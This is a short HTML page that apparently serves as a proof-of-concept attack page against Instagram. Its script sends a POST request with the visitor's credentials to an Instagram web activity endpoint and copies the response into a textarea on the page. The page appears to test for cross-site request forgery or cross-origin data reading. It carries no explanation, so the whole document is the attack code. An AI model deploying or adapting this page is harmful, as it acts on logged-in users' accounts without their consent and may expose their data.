<html>
	<head></head>
	<body><textarea></textarea></body>
	<script>
var x = new XMLHttpRequest();
x.open("POST","https://www.instagram.com/web/activity/mark_checked/",true);
x.withCredentials = true;
x.onreadystatechange = function(){if(x.status==200 && x.readyState ==4)
	document.getElementsByTagName('textarea')[0].value = x.responseText;
};
x.send();
</script>
</html>
